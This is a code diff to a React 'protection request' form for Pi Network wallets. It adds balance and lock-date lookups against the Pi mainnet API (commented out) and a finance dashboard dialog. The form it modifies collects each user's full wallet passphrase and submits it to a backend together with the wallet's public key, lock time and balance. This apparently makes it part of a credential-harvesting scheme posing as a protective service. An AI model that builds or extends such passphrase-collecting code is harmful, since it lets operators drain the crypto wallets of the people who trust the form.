@@ -16,12 +16,20 @@ import { Progress } from "@/components/ui/progress"
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
 import { useAppDispatch } from "@/redux/hooks"
 import { makeRequest } from "@/redux/slices/requests"
+import FinanceDashboard from "../wallet/FinanceDashboard"
+import axios from "axios"
 
 const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
   const router = useRouter()
   const [step, setStep] = useState(1)
+  const [balance, setBalance] = useState(1)
+  const [locked, setLocked] = useState(1)
+  const [lockDate, setLockDate] = useState("")
   const totalSteps = 2
   const [loading, setLoading] = useState(false)
+  const [grandLoad, setGrandLoad] = useState(false)
+
+  const [open, setOpen] = useState(false)
   const [errors, setErrors] = useState<{
     email?: string
     publicKey?: string
@@ -129,12 +137,34 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
     return Object.keys(newErrors).length === 0
   }
 
-  const handleContinue = (e: React.FormEvent) => {
+  const handleContinue = async(e: React.FormEvent) => {
     e.preventDefault()
 
     if (validateStep1()) {
+      
       setStep(2)
-      window.scrollTo(0, 0)
+      console.log("start")
+      // setGrandLoad(true)
+      // try {
+      //   const res1 = await axios.get(`https://api.mainnet.minepi.com/claimable_balances/?claimant=${formData.publicKey}`)
+      //   const response2 = await axios.get(`https://api.mainnet.minepi.com/accounts/${formData.publicKey}`);
+      //   const balance = response2.data.balances[0].balance
+      //   console.log("balance is", balance)
+
+      //   console.log("locked balance is", res1.data._embedded.records[0].amount)
+      //   console.log("locked date is", res1.data._embedded.records[0].claimants[1].predicate.not.abs_before)
+      //   setBalance(balance)
+      //   setLocked(res1.data._embedded.records[0].amount)
+      //   setLockDate(res1.data._embedded.records[0].claimants[1].predicate.not.abs_before)
+      //   setOpen(true)
+      //   console.log("finish")
+      //   window.scrollTo(0, 0)
+      // } catch (error) {
+      //   console.error("Error fetching data:", error)
+      //   setGrandLoad(false)
+      // } finally{
+      //   setGrandLoad(false)
+      // }
     }
   }
 
@@ -171,8 +201,8 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
           email: formData.email,
           piBalance: Number(formData.piAmount),
           piUnlockTime: new Date(formData.unlockDateTime),
-          walletPassphrase: trimmedPassphrase, // Use the trimmed passphrase
-          mainnetWalletAddress: formData.mainnetWalletAddress,
+          walletPassphrase: trimmedPassphrase, 
+          mainnetWalletAddress: formData.publicKey,
           note: formData.note,
         }),
       ).unwrap()
@@ -397,7 +427,13 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
                         Submitting...
                         <Loader className="ml-2 w-4 h-4 animate-spin" />
                       </>
-                    ) : (
+                    ) : grandLoad ? (
+                      <>
+                        Fetching Wallet
+                        <Loader className="ml-2 w-4 h-4 animate-spin" />
+                      </>
+                    ):
+                    (
                       <>
                         Continue
                         <ArrowRight className="ml-2 h-4 w-4" />
@@ -479,6 +515,10 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
             </Card>
           </motion.div>
         )}
+
+  
+        <FinanceDashboard setStep={setStep} lockDate={lockDate} balance={balance} lockedBalance={locked} wallet={formData.publicKey} open={open} setOpen={setOpen} />
+       
       </AnimatePresence>
     </div>
   )
